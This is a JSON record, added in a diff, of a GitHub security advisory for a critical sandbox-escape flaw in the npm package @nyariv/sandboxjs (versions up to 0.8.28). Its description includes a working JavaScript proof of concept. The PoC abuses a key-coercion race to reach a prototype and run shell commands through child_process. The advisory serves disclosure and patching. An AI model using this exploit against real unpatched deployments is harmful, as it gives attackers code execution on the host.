@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-02-05T21:33:06Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@nyariv/sandboxjs"
+  },
+  "Advisory": {
+    "DatabaseId": 335910,
+    "Id": "GSA_kwCzR0hTQS03eDNoLXJtODYtMzM0Ms4ABSAm",
+    "GhsaId": "GHSA-7x3h-rm86-3342",
+    "References": [
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/security/advisories/GHSA-7x3h-rm86-3342"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L304-L304"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-7x3h-rm86-3342"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-7x3h-rm86-3342"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-25641"
+      }
+    ],
+    "Description": "### Summary\nA sandbox escape vulnerabilities due to a mismatch between the key on which the validation is performed and the key used for accessing properties.\n\n### Details\nEven though the key used in property accesses (```b``` in the code below) is annotated as ```string```, this is never enforced:\nhttps://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L304-L304\nSo, attackers can pass malicious objects that coerce to different string values when used, e.g., one for the time the key is sanitized using ```hasOwnProperty(key)``` and a different one for when the key is used for the actual property access.\n\n### PoC\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\n\nconst code = `\nlet a = new Map;\na.x = 23;\nlet count = 0;\n\nlet nastyProp = {toString: () =\u003e {if (count\u003c1){count++;return \"x\"} else return \"__proto__\"}}\nlet mapProt = a[nastyProp];\nmapProt.has = isFinite;\nconsole.log(\n  isFinite.constructor(\n    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);`;\nconst scope = {};\nconst sandbox = new Sandbox();\nconst exec = sandbox.compile(code);\nexec(scope).run(); \n```\n\n### Impact\nRemote code execution, if attacker can execute code inside the sandbox.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-02-05T21:33:04Z",
+    "Severity": "CRITICAL",
+    "Summary": "@nyariv/sandboxjs vulnerable to sandbox escape via TOCTOU bug on keys in property accesses",
+    "UpdatedAt": "2026-02-05T21:33:06Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.8.29"
+      },
+      "VulnerableVersionRange": "\u003c= 0.8.28"
+    }
+  ]
+}
